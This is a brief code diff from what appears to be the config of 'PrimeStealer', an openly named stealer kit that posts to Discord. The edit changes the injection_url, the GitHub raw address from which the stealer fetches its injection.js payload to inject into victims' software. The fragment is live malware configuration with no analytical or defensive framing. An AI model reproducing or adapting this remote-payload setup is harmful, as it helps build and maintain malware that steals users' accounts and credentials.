@@ -14,7 +14,7 @@ const config = {
   embed_name: 'PrimeStealer Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1145210470077317140/1220877104065810443/prime.png?ex=66108968&is=65fe1468&hm=8f2b7f1e8c21a77ad7a5ba12a9dab67ecd34ec900c95dd63e2a47e8600bb83d8&=&format=webp&quality=lossless&width=192&height=192'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/DecariusWoods1/Stealerinjection/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/DecariusWoods1/index/main/injection.js', 
   /**
    
    **/
